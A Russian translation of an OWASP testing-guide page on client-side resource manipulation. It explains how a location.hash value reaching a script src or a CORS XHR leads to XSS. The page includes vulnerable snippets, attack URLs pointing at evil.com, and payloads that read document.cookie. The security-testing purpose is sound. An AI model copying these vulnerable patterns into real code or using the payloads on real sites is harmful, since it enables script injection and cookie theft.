# Манипулирование ресурсами на стороне клиента

| ID |
| --- |
| WSTG-CLNT-06 |

## Резюме

Уязвимость манипуляции ресурсами на стороне клиента (Client-side Resource Manipulation) представляет собой дефект валидации входных данных. Она возникает, когда приложение принимает контролируемый пользователем ввод, задающий путь к ресурсу — например, источник для iframe, сценария JavaScript или обработчика XMLHttpRequest. Суть уязвимости заключается в возможности управления URL-адресами, ссылающимися на различные ресурсы веб-страницы. Степень воздействия может варьироваться, и чаще всего данная брешь эксплуатируется для проведения XSS-атак. Уязвимость позволяет нарушить штатную логику работы приложения, принуждая его загружать и отрисовывать вредоносные объекты.

В следующем коде на JavaScript показан потенциально уязвимый скрипт, в котором злоумышленник может управлять источником `location.hash` (source), значение которого попадает в атрибут `src` элемента script. Данный конкретный случай приводит к атаке XSS, поскольку позволяет внедрить сторонний код JavaScript.

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

Злоумышленник может атаковать жертву, склонив её перейти по следующему URL:

`www.victim.com/#https://evil.com/js.js`

Где файл `js.js` содержит:

```javascript
alert(document.cookie)
```

Это приведет к отображению всплывающего окна alert в браузере жертвы.

Более опасный сценарий предполагает возможность контроля над URL, вызываемым в запросе совместного использования ресурсов между разными источниками (Cross-Origin Resource Sharing, CORS). Поскольку CORS разрешает запрашивающему домену доступ к целевому ресурсу на основе HTTP-заголовков, атакующий может заставить целевую страницу загрузить вредоносный контент с контролируемого им веб-сайта.

Ниже приведен пример уязвимой страницы:

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

Значение `location.hash` контролируется пользователем и используется для запроса внешнего ресурса, который затем отражается на странице через конструкцию `innerHTML`. Злоумышленник может заставить жертву перейти по следующему URL:

`www.victim.com/#https://evil.com/html.html`

При этом обработчик полезной нагрузки для `html.html` выглядит следующим образом:

```html
<?php
header('Access-Control-Allow-Origin: https://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## Цели тестирования

- Идентифицировать приёмники (sinks) со слабой валидацией входных данных.
- Оценить степень воздействия манипуляции ресурсами.

## Методика тестирования

Для ручной проверки на наличие уязвимостей данного типа необходимо определить, использует ли приложение входящие параметры без надлежащей валидации. В таком случае эти параметры находятся под контролем пользователя и могут использоваться для указания внешних ресурсов. Поскольку в приложение может быть включено множество разнообразных ресурсов (таких как изображения, видео, объекты, таблицы CSS и фреймы iframe), клиентские скрипты, обрабатывающие связанные URL, должны быть тщательно проанализированы на наличие потенциальных дефектов.

В следующей таблице представлены возможные точки внедрения (приёмники / sinks), подлежащие обязательной проверке:

| Resource Type   | Tag/Method                                | Sink   |
| --------------- | ----------------------------------------- | ------ |
| Frame           | iframe                                    | src    |
| Link            | a                                         | href   |
| AJAX Request    | `xhr.open(method, [url], true);` | URL    |
| CSS             | link                                      | href   |
| Image           | img                                       | src    |
| Object          | object                                    | data   |
| Script          | script                                    | src    |

Наибольший интерес представляют приёмники, позволяющие злоумышленнику внедрять исполняемый клиентский код (например, JavaScript), что ведет к возникновению уязвимостей XSS.
